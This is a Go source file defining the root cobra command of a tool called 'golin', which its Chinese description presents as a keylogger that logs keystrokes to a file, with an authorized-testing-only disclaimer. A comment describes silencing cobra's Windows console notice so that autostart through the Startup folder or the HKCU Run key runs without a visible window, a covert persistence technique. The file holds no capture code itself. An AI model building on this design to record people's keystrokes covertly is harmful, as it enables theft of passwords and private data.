package cmd

import (
	"os"

	"github.com/spf13/cobra"
)

// rootCmd represents the base command when called without any subcommands
var rootCmd = &cobra.Command{
	Use:   "golin",
	Short: "键盘记录器",
	Long: `仅保留键盘记录功能：实时记录键盘输入信息到日志文件中。
本软件仅用于经授权的测试，禁止使用本工具实施未授权测试，若违法使用导致任何责任，与软件作者无关，均由用户自行承担。`,
}

func Execute() {
	// 禁用 cobra 的 Windows Mousetrap:进程由 explorer.exe 拉起(启动文件夹
	// 快捷方式、HKCU Run 键自启)时,cobra 默认打印 "This is a command line
	// tool..." 并停留数秒后退出,导致开机弹窗且这两条自启链路无法进入看门狗逻辑。
	cobra.MousetrapHelpText = ""
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}
